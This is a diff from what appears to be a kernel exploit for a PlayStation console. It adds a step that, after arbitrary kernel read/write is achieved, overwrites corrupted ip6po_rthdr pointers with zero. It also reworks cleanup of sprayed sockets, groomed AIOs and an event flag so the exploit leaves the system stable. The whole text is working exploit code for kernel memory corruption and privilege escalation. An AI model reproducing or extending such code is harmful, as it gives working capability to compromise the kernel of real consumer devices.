@@ -1304,7 +1304,7 @@ int32_t make_kernel_arw()
     printf_debug("* Achieved restricted write!\n");
 
     Kernel_Memory kmemory = Kernel_Memory(
-        pktopts_sds[0], dirty_sd, s4.pipe_fds, s4.pipe_p
+        pktopts_sds[0], dirty_sd, s4.pipe_fds, s4.pipe_p, s4.pipe_buffer
     );
     printf_debug("* Kernel_Memory initialized!\n");
     
@@ -1329,26 +1329,44 @@ int32_t make_kernel_arw()
 
     printf_debug("* Achieved arbitrary kernel read/write!\n");
 
+    // RESTORE: clean corrupt pointers
+    // pktopts.ip6po_rthdr = NULL
+    ptr64_t r_rthdr_p = r_pktopts_p + IP6PO_RTHDR_OFFSET;
+    ptr64_t d_rthdr_p = s4.d_pktopts_p + IP6PO_RTHDR_OFFSET;
+    kmemory.write64(r_rthdr_p, 0);
+    kmemory.write64(d_rthdr_p, 0);
+    printf_debug("Corrupt pointers cleaned\n");
+
     return err;
 }
 
 void cleanup()
 {
+    printf_debug("Cleaning up...\n");
+
     // Close unix socketpair
     PS::close(s0.unixpair.unblock_fd);
     PS::close(s0.unixpair.block_fd);
 
-    // Free blocking AIOs
-    free_aios(&s0.block_id, 1);
-
-    // Close all sprayed sockets
-    for (uint32_t i = 0; i < NUM_SDS; i++)
-        if (s0.sds[i] >= 0)
-            PS::close(s0.sds[i]);
-    
     // Free groomed AIOs
     free_aios2(s0.groom_ids, NUM_GROOM_IDS);
 
+    // Free blocking AIOs
+    aio_multi_wait(
+        &s0.block_id,
+        1,
+        aio_errs,
+        SCE_KERNEL_AIO_WAIT_AND,
+        0
+    );
+    aio_multi_delete(&s0.block_id, 1, aio_errs);
+
+    // Close all sprayed sockets
+    for (uint32_t i = 0; i < NUM_SDS; i++)
+        if (s0.sds[i] > 0)
+            PS::close(s0.sds[i]);
+
+    // TODO: reconsider this
     // Close sd_listen
     if (sd_listen > 0) PS::close(sd_listen);
 
@@ -1357,6 +1375,9 @@ void cleanup()
 
     // Close rthdr_sds[0]
     if (rthdr_sds[0] > 0) PS::close(rthdr_sds[0]);
+
+    // Free evf
+    if (s2.evf != 0) free_evf(s2.evf);
 }
 
 // overview:
